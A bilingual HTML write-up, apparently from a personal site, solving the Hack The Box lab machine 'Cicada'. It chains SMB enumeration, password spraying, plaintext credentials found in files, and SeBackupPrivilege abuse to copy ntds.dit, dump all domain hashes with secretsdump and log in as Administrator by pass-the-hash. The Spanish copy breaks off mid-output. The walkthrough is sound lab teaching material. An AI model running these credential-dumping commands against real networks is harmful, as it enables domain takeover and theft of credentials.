@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cicada | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">cicada</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+                <span class="badge badge-os">Windows</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p>
+                        The attack began with SMB enumeration against a Windows Domain Controller. Anonymous access to
+                        the <code>HR</code> share revealed a welcome document containing a default password left behind
+                        by the IT team. With no valid username yet, RID-cycling via <code>netexec</code> was used to
+                        enumerate domain user accounts, after which password spraying confirmed that
+                        <code>michael.wrightson</code> had never changed that default credential.
+                    </p>
+                    <p>
+                        Although <code>michael.wrightson</code> lacked WinRM access, his authenticated SMB session was
+                        enough to enumerate user descriptions — where <code>david.orelious</code> had carelessly stored
+                        his own password in plaintext. His account granted access to the <code>DEV</code> share, which
+                        contained a PowerShell backup script hardcoding the credentials of <code>emily.oscars</code>.
+                    </p>
+                    <p>
+                        <code>emily.oscars</code> had WinRM access and, crucially, held the
+                        <code>SeBackupPrivilege</code> right. This privilege allows reading any file on the system
+                        regardless of ACLs, making it possible to extract the Active Directory database
+                        (<code>ntds.dit</code>) via a Volume Shadow Copy and dump all domain hashes with
+                        <code>impacket-secretsdump</code>. The Administrator NT hash was then used for a Pass-the-Hash
+                        login, completing the machine.
+                    </p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services on the target:</p>
+
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports on the Cicada domain controller, including Kerberos on 88, LDAP on 389, SMB on 445, and WinRM on 5985" /></p>
+
+                <p>The results confirm this is a Windows Active Directory Domain Controller. Key ports include
+                    Kerberos (<code>88</code>), LDAP (<code>389</code>, <code>3268</code>, <code>3269</code>), SMB
+                    (<code>445</code>), and WinRM (<code>5985</code>). I add <code>cicada.htb</code> and
+                    <code>dc.cicada.htb</code> to <code>/etc/hosts</code> and begin enumerating SMB.</p>
+
+                <h2>SMB Enumeration — Anonymous Access &amp; Credential Leakage</h2>
+                <p>First, I check available shares using <code>netexec</code> and <code>smbclient</code> with no
+                    credentials (null session):</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb --shares</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB  10.129.231.149  445  CICADA-DC  [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</code></pre>
+
+                <p>Null authentication is confirmed. I use <code>smbclient</code> to list shares directly:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -N -L //cicada.htb</code></pre>
+
+                <pre><code class="language-plaintext">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+DEV             Disk
+HR              Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share</code></pre>
+
+                <p>Beyond the standard shares, two non-default shares stand out: <code>DEV</code> and <code>HR</code>.
+                    I try connecting to both anonymously.</p>
+
+                <p>Access to <code>DEV</code> is denied, but <code>HR</code> is readable:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -N //cicada.htb/HR</code></pre>
+
+                <pre><code class="language-plaintext">smb: \> dir
+  .                                   D        0
+  ..                                  D        0
+  Notice from HR.txt                  A     1266</code></pre>
+
+                <pre><code class="language-bash">smb: \> get "Notice from HR.txt"</code></pre>
+
+                <p>Note the quotes — necessary to handle the spaces in the filename. The file contents reveal a
+                    default password left for new hires:</p>
+
+                <pre><code class="language-plaintext">Dear new hire!
+
+Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
+security protocols, it's essential that you change your default password to something
+unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+To change your password:
+1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.
+2. Once logged in, navigate to your account settings or profile settings section.
+3. Look for the option to change your password. This will be labeled as "Change Password".
+[...]
+
+Best regards,
+Cicada Corp</code></pre>
+
+                <p>I now have a valid password — <code>Cicada$M6Corpb*@Lp#nZp!8</code> — but still need valid
+                    usernames to spray it against.</p>
+
+                <h2>User Enumeration — RID Cycling</h2>
+                <p>I first attempt to find valid usernames via <code>kerbrute</code> against the Kerberos service, but
+                    the wordlist only surfaces the well-known <code>guest</code> and <code>administrator</code>
+                    accounts, neither of which is useful here.</p>
+
+                <p>Instead, I use RID cycling — a technique that exploits how Windows assigns sequential numeric
+                    identifiers (RIDs) to every security principal (users, groups, computers) in the domain. By
+                    iterating over these IDs via an authenticated or guest SMB session, it's possible to resolve them
+                    back to account names without needing any special privileges:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u <span style="color:#e06c75;">'guest'</span> -p <span style="color:#e06c75;">''</span> --rid-brute</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\guest:
+SMB  10.129.231.149  445  CICADA-DC  500: CICADA\Administrator (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  501: CICADA\Guest (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  502: CICADA\krbtgt (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  512: CICADA\Domain Admins (SidTypeGroup)
+SMB  10.129.231.149  445  CICADA-DC  513: CICADA\Domain Users (SidTypeGroup)
+[...]
+SMB  10.129.231.149  445  CICADA-DC  1104: CICADA\john.smoulder (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1106: CICADA\michael.wrightson (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1108: CICADA\david.orelious (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1109: CICADA\Dev Support (SidTypeGroup)
+SMB  10.129.231.149  445  CICADA-DC  1601: CICADA\emily.oscars (SidTypeUser)</code></pre>
+
+                <p>I now have five domain users: <code>john.smoulder</code>, <code>sarah.dantelia</code>,
+                    <code>michael.wrightson</code>, <code>david.orelious</code>, and <code>emily.oscars</code>. I save
+                    these to <code>users.txt</code> and proceed to password spraying.</p>
+
+                <h2>Password Spraying — First Valid Credentials</h2>
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u users.txt -p <span style="color:#e06c75;">'Cicada$M6Corpb*@Lp#nZp!8'</span> --continue-on-success</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE</code></pre>
+
+                <p><code>michael.wrightson</code> never changed the default password. Credentials confirmed:
+                    <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code>.</p>
+
+                <p>I check whether this account has WinRM access — it doesn't. The user is likely not a member of the
+                    <code>Remote Management Users</code> group. Accessing the <code>DEV</code> share with these
+                    credentials also fails. However, the account is authenticated enough to query domain user
+                    information via SMB.</p>
+
+                <h2>Credentials in User Description — david.orelious</h2>
+                <p>Enumerating domain users with <code>netexec --users</code> reveals something interesting in the
+                    <code>Description</code> field:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u michael.wrightson -p <span style="color:#e06c75;">'Cicada$M6Corpb*@Lp#nZp!8'</span> --users</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB  10.129.231.149  445  CICADA-DC  Administrator        2024-08-26 20:08:03  1  Built-in account for administering the computer/domain
+SMB  10.129.231.149  445  CICADA-DC  Guest                2024-08-28 17:26:56  0  Built-in account for guest access to the computer/domain
+SMB  10.129.231.149  445  CICADA-DC  krbtgt               2024-03-14 11:14:10  0  Key Distribution Center Service Account
+SMB  10.129.231.149  445  CICADA-DC  john.smoulder        2024-03-14 12:17:29  1
+SMB  10.129.231.149  445  CICADA-DC  sarah.dantelia       2024-03-14 12:17:29  1
+SMB  10.129.231.149  445  CICADA-DC  michael.wrightson    2024-03-14 12:17:29  0
+SMB  10.129.231.149  445  CICADA-DC  david.orelious       2024-03-14 12:17:29  1  Just in case I forget my password is aRt$Lp#7t*VQ!3
+SMB  10.129.231.149  445  CICADA-DC  emily.oscars         2024-08-22 21:20:17  1</code></pre>
+
+                <p><code>david.orelious</code> stored his password in his own account description field. New
+                    credentials: <code>david.orelious:aRt$Lp#7t*VQ!3</code>.</p>
+
+                <p>This account also lacks WinRM access, but it does have read permission on the <code>DEV</code>
+                    share:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -U <span style="color:#e06c75;">'david.orelious%aRt$Lp#7t*VQ!3'</span> //cicada.htb/DEV</code></pre>
+
+                <pre><code class="language-plaintext">smb: \> dir
+  .                                   D        0
+  ..                                  D        0
+  Backup_script.ps1                   A      601</code></pre>
+
+                <pre><code class="language-bash">smb: \> get Backup_script.ps1</code></pre>
+
+                <h2>Credentials in Backup Script — emily.oscars</h2>
+                <p>The downloaded PowerShell script contains hardcoded credentials:</p>
+
+                <pre><code class="language-powershell"><span style="color:#c678dd;">$sourceDirectory</span> = <span style="color:#98c379;">"C:\smb"</span>
+<span style="color:#c678dd;">$destinationDirectory</span> = <span style="color:#98c379;">"D:\Backup"</span>
+
+<span style="color:#c678dd;">$username</span> = <span style="color:#98c379;">"emily.oscars"</span>
+<span style="color:#c678dd;">$password</span> = <span style="color:#61afef;">ConvertTo-SecureString</span> <span style="color:#98c379;">"Q!3@Lp#M6b*7t*Vt"</span> -AsPlainText -Force
+<span style="color:#c678dd;">$credentials</span> = <span style="color:#61afef;">New-Object</span> System.Management.Automation.PSCredential(<span style="color:#c678dd;">$username</span>, <span style="color:#c678dd;">$password</span>)
+
+<span style="color:#c678dd;">$dateStamp</span> = <span style="color:#61afef;">Get-Date</span> -Format <span style="color:#98c379;">"yyyyMMdd_HHmmss"</span>
+<span style="color:#c678dd;">$backupFileName</span> = <span style="color:#98c379;">"smb_backup_$dateStamp.zip"</span>
+<span style="color:#c678dd;">$backupFilePath</span> = <span style="color:#61afef;">Join-Path</span> -Path <span style="color:#c678dd;">$destinationDirectory</span> -ChildPath <span style="color:#c678dd;">$backupFileName</span>
+
+<span style="color:#61afef;">Compress-Archive</span> -Path <span style="color:#c678dd;">$sourceDirectory</span> -DestinationPath <span style="color:#c678dd;">$backupFilePath</span>
+<span style="color:#61afef;">Write-Host</span> <span style="color:#98c379;">"Backup completed successfully. Backup file saved to: $backupFilePath"</span></code></pre>
+
+                <p>Third set of credentials: <code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code>.</p>
+
+                <h2>Initial Access — WinRM as emily.oscars</h2>
+                <p>I verify that <code>emily.oscars</code> has WinRM access before connecting:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> winrm cicada.htb -u <span style="color:#e06c75;">'emily.oscars'</span> -p <span style="color:#e06c75;">'Q!3@Lp#M6b*7t*Vt'</span></code></pre>
+
+                <pre><code class="language-plaintext">WINRM  10.129.231.149  5985  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">evil-winrm</span> -i cicada.htb -u <span style="color:#e06c75;">'emily.oscars'</span> -p <span style="color:#e06c75;">'Q!3@Lp#M6b*7t*Vt'</span></code></pre>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents></code></pre>
+
+                <p>Shell access confirmed. I can now retrieve the user flag from the Desktop.</p>
+
+                <h2>Privilege Escalation — SeBackupPrivilege</h2>
+                <p>Checking the current token privileges reveals something valuable:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">whoami</span> /priv</code></pre>
+
+                <pre><code class="language-plaintext">PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre>
+
+                <p><code>SeBackupPrivilege</code> allows reading <em>any</em> file on the system, bypassing all
+                    filesystem ACLs. This makes it possible to extract the Active Directory database file
+                    <code>ntds.dit</code>, which stores all domain credential hashes.</p>
+
+                <p>The catch is that <code>ntds.dit</code> is locked while the system is running and cannot be
+                    accessed directly. The solution is to create a Volume Shadow Copy of the <code>C:</code> drive
+                    and read the file from that snapshot instead.</p>
+
+                <h3>Creating a Volume Shadow Copy with diskshadow</h3>
+                <p>I create a working directory and a script file for <code>diskshadow</code>:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">mkdir</span> C:\temp
+<span style="color:#61afef;">cd</span> C:\temp</code></pre>
+
+                <p>Contents of <code>C:\temp\shadow.txt</code>:</p>
+
+                <pre><code class="language-plaintext">set context persistent nowriters
+add volume c: alias pwn
+create
+expose %pwn% z:</code></pre>
+
+                <p>These instructions tell <code>diskshadow</code> to create a persistent shadow copy of
+                    <code>C:</code> and expose it as drive <code>z:\</code>. I run it:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">diskshadow</span> /s C:\temp\shadow.txt</code></pre>
+
+                <pre><code class="language-plaintext">-> set context persistent nowriters
+-> add volume c: alias pwn
+-> create
+Alias pwn for shadow ID {36cde1b4-2301-490a-9995-b2ee24875967} set as environment variable.
+[...]
+-> expose %pwn% z:
+-> %pwn% = {36cde1b4-2301-490a-9995-b2ee24875967}
+The shadow copy was successfully exposed as z:\.</code></pre>
+
+                <p>I verify the snapshot is accessible:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">ls</span> z:\</code></pre>
+
+                <pre><code class="language-plaintext">Directory: z:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         8/22/2024  11:45 AM                PerfLogs
+d-r---         8/29/2024  12:32 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----         3/14/2024   5:21 AM                Shares
+d-----         2/22/2026   8:42 PM                temp
+d-r---         8/26/2024   1:11 PM                Users
+d-----         9/23/2024   9:35 AM                Windows</code></pre>
+
+                <h3>Extracting ntds.dit with robocopy</h3>
+                <p>I use <code>robocopy</code> with the <code>/b</code> (backup mode) flag to copy
+                    <code>ntds.dit</code> from the shadow copy, leveraging <code>SeBackupPrivilege</code> to bypass
+                    the file's ACL:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">robocopy</span> /b z:\Windows\NTDS\ C:\temp\ ntds.dit</code></pre>
+
+                <pre><code class="language-plaintext">-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+  Source : z:\Windows\NTDS\
+    Dest : C:\temp\
+   Files : ntds.dit
+[...]
+          1    z:\Windows\NTDS\
+ New File        16.0 m    ntds.dit</code></pre>
+
+                <h3>Extracting the SYSTEM hive</h3>
+                <p>The <code>ntds.dit</code> file alone is not enough — Windows encrypts the credential data using a
+                    boot key (SysKey) stored in the SYSTEM registry hive. I need both files to decrypt the hashes:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">reg</span> save HKLM\SYSTEM C:\temp\system.hiv</code></pre>
+
+                <p>I download both files to my local machine:</p>
+
+                <pre><code class="language-powershell"><span style="color:#61afef;">download</span> ntds.dit
+<span style="color:#61afef;">download</span> system.hiv</code></pre>
+
+                <h3>Dumping Hashes with impacket-secretsdump</h3>
+                <p>With both files on my machine, I run <code>impacket-secretsdump</code> in offline mode to decrypt
+                    and extract all domain credential hashes:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">impacket-secretsdump</span> -ntds ntds.dit -system system.hiv LOCAL</code></pre>
+
+                <pre><code class="language-plaintext">Impacket v0.14.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
+[*] Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::
+cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::
+cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::
+cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::
+cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::
+cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::
+[*] Kerberos keys from ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:e47fd7646fa8cf1836a79166f5775405834e2c060322d229bc93f26fb67d2be5
+[...]</code></pre>
+
+                <p>The Administrator's NT hash is now available. No cracking required — I can authenticate directly
+                    using Pass-the-Hash.</p>
+
+                <h2>Root Access — Pass-the-Hash as Administrator</h2>
+                <pre><code class="language-bash"><span style="color:#86b300;">evil-winrm</span> -i cicada.htb -u <span style="color:#e06c75;">'Administrator'</span> -H <span style="color:#e06c75;">'2b87e7c93a3e8a0ea4a581937016f341'</span></code></pre>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+cicada\administrator</code></pre>
+
+                <p>Full domain administrator access achieved. The root flag is available on the Administrator's
+                    Desktop.</p>
+            </div>
+
+            <!-- ==================== SPANISH ==================== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p>
+                        El ataque comenzó con enumeración SMB contra un Domain Controller de Windows. El acceso
+                        anónimo al share <code>HR</code> reveló un documento de bienvenida con una contraseña por
+                        defecto dejada por el equipo de TI. Sin usuarios válidos todavía, se utilizó RID-cycling
+                        mediante <code>netexec</code> para enumerar las cuentas del dominio, tras lo cual el password
+                        spraying confirmó que <code>michael.wrightson</code> nunca cambió esa credencial por defecto.
+                    </p>
+                    <p>
+                        Aunque <code>michael.wrightson</code> no tenía acceso por WinRM, su sesión SMB autenticada
+                        fue suficiente para enumerar las descripciones de los usuarios — donde
+                        <code>david.orelious</code> había guardado su propia contraseña en texto claro. Su cuenta
+                        daba acceso al share <code>DEV</code>, que contenía un script PowerShell de backup con las
+                        credenciales de <code>emily.oscars</code> hardcodeadas.
+                    </p>
+                    <p>
+                        <code>emily.oscars</code> tenía acceso WinRM y, lo más importante, disponía del privilegio
+                        <code>SeBackupPrivilege</code>. Este privilegio permite leer cualquier archivo del sistema
+                        independientemente de las ACLs, lo que hizo posible extraer la base de datos de Active
+                        Directory (<code>ntds.dit</code>) mediante una copia de volumen en sombra y volcar todos los
+                        hashes del dominio con <code>impacket-secretsdump</code>. El hash NT del Administrador se
+                        utilizó después para un login Pass-the-Hash, completando la máquina.
+                    </p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios en el
+                    objetivo:</p>
+
+                <p><img src="./media/image1.png" alt="Resultados del escaneo nmap mostrando los puertos abiertos en el Domain Controller de Cicada, incluyendo Kerberos en el 88, LDAP en el 389, SMB en el 445 y WinRM en el 5985" /></p>
+
+                <p>Los resultados confirman que se trata de un Domain Controller de Active Directory en Windows. Los
+                    puertos clave son Kerberos (<code>88</code>), LDAP (<code>389</code>, <code>3268</code>,
+                    <code>3269</code>), SMB (<code>445</code>) y WinRM (<code>5985</code>). Añado
+                    <code>cicada.htb</code> y <code>dc.cicada.htb</code> a <code>/etc/hosts</code> y comienzo a
+                    enumerar SMB.</p>
+
+                <h2>Enumeración SMB — Acceso Anónimo y Filtración de Credenciales</h2>
+                <p>Primero compruebo los shares disponibles usando <code>netexec</code> y <code>smbclient</code> sin
+                    credenciales (sesión nula):</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb --shares</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB  10.129.231.149  445  CICADA-DC  [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</code></pre>
+
+                <p>Se confirma la autenticación nula. Uso <code>smbclient</code> para listar los shares directamente:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -N -L //cicada.htb</code></pre>
+
+                <pre><code class="language-plaintext">Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+DEV             Disk
+HR              Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share</code></pre>
+
+                <p>Más allá de los shares estándar, destacan dos no predeterminados: <code>DEV</code> y
+                    <code>HR</code>. Pruebo a conectarme a ambos de forma anónima.</p>
+
+                <p>El acceso a <code>DEV</code> es denegado, pero <code>HR</code> es legible:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">smbclient</span> -N //cicada.htb/HR</code></pre>
+
+                <pre><code class="language-plaintext">smb: \> dir
+  .                                   D        0
+  ..                                  D        0
+  Notice from HR.txt                  A     1266</code></pre>
+
+                <pre><code class="language-bash">smb: \> get "Notice from HR.txt"</code></pre>
+
+                <p>Ojo con las comillas — son necesarias para manejar los espacios en el nombre del archivo. El
+                    contenido del fichero revela una contraseña por defecto dejada para los nuevos empleados:</p>
+
+                <pre><code class="language-plaintext">Dear new hire!
+
+Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our
+security protocols, it's essential that you change your default password to something
+unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+To change your password:
+1. Log in to your Cicada Corp account using the provided username and the default password mentioned above.
+2. Once logged in, navigate to your account settings or profile settings section.
+3. Look for the option to change your password. This will be labeled as "Change Password".
+[...]
+
+Best regards,
+Cicada Corp</code></pre>
+
+                <p>Ahora tengo una contraseña válida — <code>Cicada$M6Corpb*@Lp#nZp!8</code> — pero todavía
+                    necesito usuarios válidos sobre los que hacer spraying.</p>
+
+                <h2>Enumeración de Usuarios — RID Cycling</h2>
+                <p>Primero intento encontrar usuarios válidos mediante <code>kerbrute</code> contra el servicio
+                    Kerberos, pero la wordlist solo descubre las cuentas bien conocidas <code>guest</code> y
+                    <code>administrator</code>, que no son útiles aquí.</p>
+
+                <p>En su lugar, uso RID cycling — una técnica que explota la forma en que Windows asigna
+                    identificadores numéricos secuenciales (RIDs) a cada principal de seguridad (usuarios, grupos,
+                    ordenadores) del dominio. Iterando sobre estos IDs mediante una sesión SMB autenticada o de
+                    invitado, es posible resolver los IDs en nombres de cuenta sin necesitar privilegios especiales:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u <span style="color:#e06c75;">'guest'</span> -p <span style="color:#e06c75;">''</span> --rid-brute</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\guest:
+SMB  10.129.231.149  445  CICADA-DC  500: CICADA\Administrator (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  501: CICADA\Guest (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  502: CICADA\krbtgt (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  512: CICADA\Domain Admins (SidTypeGroup)
+SMB  10.129.231.149  445  CICADA-DC  513: CICADA\Domain Users (SidTypeGroup)
+[...]
+SMB  10.129.231.149  445  CICADA-DC  1104: CICADA\john.smoulder (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1106: CICADA\michael.wrightson (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1108: CICADA\david.orelious (SidTypeUser)
+SMB  10.129.231.149  445  CICADA-DC  1109: CICADA\Dev Support (SidTypeGroup)
+SMB  10.129.231.149  445  CICADA-DC  1601: CICADA\emily.oscars (SidTypeUser)</code></pre>
+
+                <p>Ahora tengo cinco usuarios del dominio: <code>john.smoulder</code>, <code>sarah.dantelia</code>,
+                    <code>michael.wrightson</code>, <code>david.orelious</code> y <code>emily.oscars</code>. Los guardo
+                    en <code>users.txt</code> y procedo al password spraying.</p>
+
+                <h2>Password Spraying — Primeras Credenciales Válidas</h2>
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u users.txt -p <span style="color:#e06c75;">'Cicada$M6Corpb*@Lp#nZp!8'</span> --continue-on-success</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
+SMB  10.129.231.149  445  CICADA-DC  [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE</code></pre>
+
+                <p><code>michael.wrightson</code> nunca cambió la contraseña por defecto. Credenciales confirmadas:
+                    <code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code>.</p>
+
+                <p>Compruebo si esta cuenta tiene acceso WinRM — no lo tiene. El usuario probablemente no es miembro
+                    del grupo <code>Remote Management Users</code>. Acceder al share <code>DEV</code> con estas
+                    credenciales también falla. Sin embargo, la cuenta está suficientemente autenticada para consultar
+                    información de usuarios del dominio vía SMB.</p>
+
+                <h2>Credenciales en la Descripción del Usuario — david.orelious</h2>
+                <p>Enumerando los usuarios del dominio con <code>netexec --users</code> se revela algo interesante
+                    en el campo <code>Description</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#86b300;">netexec</span> smb cicada.htb -u michael.wrightson -p <span style="color:#e06c75;">'Cicada$M6Corpb*@Lp#nZp!8'</span> --users</code></pre>
+
+                <pre><code class="language-plaintext">SMB  10.129.231.149  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
+SMB  10.129.231.149  445  CICADA-DC  Administrator        2024-08-26 20:08:03  1  Built-in account for administering the computer/domain
+SMB  10.129.231.149  445  CICADA-DC  Guest                2024-08-28 17:26:56  0  Built-in account for guest access to the computer/domain
